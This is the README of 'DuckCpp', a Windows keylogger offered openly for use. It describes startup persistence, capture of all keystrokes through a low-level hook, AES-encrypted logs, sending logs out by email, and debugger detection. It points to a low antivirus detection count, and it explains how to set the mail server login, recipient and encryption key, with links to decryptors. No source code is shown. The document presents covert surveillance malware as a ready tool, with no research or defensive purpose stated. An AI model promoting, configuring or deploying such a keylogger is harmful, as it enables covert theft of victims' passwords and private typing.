## DuckCpp
DuckCpp is a multifunctional keylogger using WinAPI and libcurl.
[VirusTotal 4/68](https://www.virustotal.com/gui/file/943115a35693d778f5c518fefc679adb243743e1a356a062659dadd95da37a50/detection)

### Features:

- Adding a copy to run automatically at startup 
- Capturing all pressed keystrokes with low-level keyboard hook
- Encryption of logs with AES
- Sending logs via email
- Debugger detection
- If email does not work or is disabled, the program writes logs to your hard drive.

#### Settings:
- bool copyToAutorun - "true" if you want the program to start automatically at startup, "false" otherwise
- int timerPeriodSeconds - the number of seconds that pass between sending an email or writing logs to disk
- tstring dirPath - the path to the directory with the executable file and logs (will be created automatically)
- tstring executableFileName - the name of executable file copied to the disk
- tstring logFileName - the log file name.

#### Encryption settings:
- bool encryptLogs - "true" if you want to enable encryption, "false" otherwise
- string aesKey - HEX string with your key (256bit)

#### Mail settings:
- bool trySendEmail - "true" if you want to enable email sending, "false" otherwise
- string login - login for the mail server
- string password - password for the mail server
- string URL - the full URL of your mail server
- string repicient - email address where emails will be sent.

#### How to decrypt logs:
If you have enabled encryption you should use [DecryptorQt](https://github.com/zorggish/DecryptorQt).
Also [DuckSharp](https://github.com/zorggish/DuckSharp) will work.
